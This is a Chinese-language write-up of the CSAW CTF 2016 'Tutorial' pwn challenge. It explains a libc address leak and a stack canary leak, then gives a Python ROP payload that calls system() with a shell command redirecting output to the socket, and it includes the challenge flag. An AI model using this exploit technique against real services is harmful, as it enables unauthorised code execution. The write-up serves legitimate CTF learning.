# CSAW CTF 2016 Quals: Tutorial (Pwn, 200)


說明：
> Ok sport, now that you have had your Warmup, maybe you want to checkout the Tutorial.
>
> [tutorial](https://github.com/isislab/CSAW-CTF-2016-Quals/raw/master/Pwn/Tutorial/tutorial) [libc-2.19.so](https://github.com/isislab/CSAW-CTF-2016-Quals/raw/master/Pwn/Tutorial/libc-2.19.so)

## 解題

下載binary後的例行動作：

```
$ checksec tutorial
[*] '/workspace/csawctf/tutorial'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```

這個binary用了*stack canary*和*NX bit*，要先找到canary value才能進行stack buffer overflow，而且因為NX bit也不能直接執行stack上的 shellcode。

先嘗試執行binary，即時得到個segfault：

```
(gdb) run
Starting program: /workspace/csawctf/tutorial

Program received signal SIGSEGV, Segmentation fault.
__GI_____strtol_l_internal (nptr=0x0, endptr=endptr@entry=0x0,
    base=base@entry=10, group=group@entry=0,
    loc=0x7ffff7bd0060 <_nl_global_locale>) at ../stdlib/strtol_l.c:298
298	../stdlib/strtol_l.c: No such file or directory.
```

用Hopper Disassembler反組譯這個binary，發現這個程式用argv[1]作為listening socket的port。

```
(gdb) run 9999
Starting program: /workspace/csawctf/tutorial 9999
User tutorial does not exist
accept: Bad file descriptor
```

執行`./tutorial 9999`沒有segfault，不過嘗試`nc localhost 9999`時會得到另一個錯誤，原來這個程式還要以*tutorial*用戶運行。在系統加入一個用戶應該就可以，不過我選擇用Hopper直接把這個檢查改為NOP，順手看見附近有一個alarm也NOP掉以免阻礙debug。這樣總算可以成功執行這個 binary：

```
$ nc localhost 9999
-Tutorial-
1.Manual
2.Practice
3.Quit
>1
Reference:0x7ffff7880860
-Tutorial-
1.Manual
2.Practice
3.Quit
>2
Time to test your exploit...
>AAAAA
AAAAA
@????x"???*e????-Tutorial-
1.Manual
2.Practice
3.Quit
>
```

選擇Manual會得到一個記憶位址，反組譯`func1`看到這個位址其實是`dlsym(0xffffffffffffffff, "puts")-0x500`，這是一個libc function的位址，有了這個位址就可以用return-to-libc方法去繞過*NX bit*的限制。

再看看Practice選項（`func2`）。

![func2](func2.png)

`func2`有三個stack variables：8 bytes stack canary，312 bytes buffer和4 byte的socket file descriptor。這個function從 socket讀取460 bytes寫進buffer，然後再由buffer讀324 bytes寫到socket。由於buffer只有 312 bytes，利用這個function就可以覆寫stack frame的return address取得control flow，因為它還會把buffer之後的12 bytes寫出來，我們還可以得到stack canary的值和上一個stack frame的`rbp`的最低32 bits。

## Exploit

去到這裡，要怎樣exploit己經很清楚，先要用Manual選項取得libc address，從Practice選項讀取stack canary和stack base address，再一次用Practice選項覆寫stack frame的return address取得control flow，再引導去libc的`system()`取得shell。不過還有一個麻煩的地方，就是這個binary用socket進行IO，我們要把shell的stdin/stdout重定向到socket的file descriptor才可以看到output。

```
$ strace -f ./tutorial 9999
...
[pid  5304] write(4, "-Tutorial-\n", 11) = 11
...
```

從`strace`看到socket的file descriptor總是`4`。最先想到的辦法就是把`sh >&4 <&4`寫到buffer上作為`system()`的 argument。因為Manual選項洩漏了`rbp`的最低32 bits，可以憑這個估算buffer的address，只要在libc裡找個`pop rdi`的ROP gadget把buffer address寫進`rdi`（System V calling convention 的第一個 function parameter），再把`rip`指到`system()`就可以了。可是執行起上來時發現不知道為什麼只有buffer的前7個character可用，連`cat *>&4`也不夠。隊友提議用`hd *>&4`，但伺服器好像沒有這個指令，之後在[two letter linux command](http://www.hioreanu.net/cs/two-letter-commands.html)裡發現`od`用得著。結果得到flag的八進制內容：

```
0000000 046106 043501 031573 051501 057531 030122 057520 030122
0000020 057520 030120 057520 030120 057520 052531 057515 052531
0000040 057515 044103 046525 041537 052510 076515 000012
...
```

這是 payload：

```python
payload = "od *>&4\0"
payload += 'A' * (312-len(payload))
payload += canary
payload += 'D' * 8
payload += p64(proc_open_addr + 0x1e7) # pop rdi; ret
payload += p32(buf_addr)
payload += p32(stack_base)
payload += p64(proc_open_addr + system_offset)
```

完整解答：[tutorial.py](tutorial.py)

這個方法其實不夠簡潔，更直接的做法是先用`dup2()`把`fd 4`複製到stdin/stdout，再行`system("/bin/sh")`，這樣就可以取得完整的shell，不過既然取到flag那就算了。

## Flag

```
FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}
```

## 其他解答

- https://github.com/ctfs/write-ups-2016/blob/master/csaw-ctf-2016-quals/Pwn/Tutorial-200/README.md
